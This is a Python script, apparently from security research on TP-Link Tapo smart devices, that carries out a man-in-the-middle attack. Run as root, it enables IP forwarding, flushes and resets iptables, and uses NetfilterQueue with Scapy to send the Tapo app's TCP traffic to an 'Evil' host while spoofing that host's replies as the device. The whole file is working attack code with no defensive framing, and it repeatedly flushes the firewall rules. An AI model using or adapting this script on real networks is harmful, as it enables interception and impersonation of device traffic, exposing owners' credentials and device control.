#!/usr/bin/env python3

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from commons.properties import *
from commons.functions import *

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

if(len(sys.argv) < 2):
    print("Usage: python3 script.py [device_type]")
    exit(1)

TapoDevice = instantiate_class_from_text(sys.argv[1])

def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())

    app_to_tapo_device = (scapy_pkt[IP].src == TapoApp.ip and scapy_pkt[IP].dst == TapoDevice.ip)
    evil_to_app = (scapy_pkt[IP].src == Evil.ip and scapy_pkt[IP].dst == TapoApp.ip)

    if scapy_pkt.haslayer(TCP) and (app_to_tapo_device or evil_to_app):
        if app_to_tapo_device:
            scapy_pkt[IP].dst = Evil.ip
        elif evil_to_app:
            scapy_pkt[IP].src = TapoDevice.ip

        scapy_pkt = re_checksum_packet(scapy_pkt)
        pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()

if __name__ == "__main__":

    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again.")

    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables --flush"
              + ";" + "iptables -A " + RULE_FORWARD
              + ";" + "iptables -A " + RULE_INPUT
              + ";" + "iptables -A " + RULE_OUTPUT)

    nf_queue = NetfilterQueue()
    nf_queue.bind(1, process_packet)

    try:
        nf_queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print("Getting out")

    nf_queue.unbind()
    
    os.system("iptables --flush")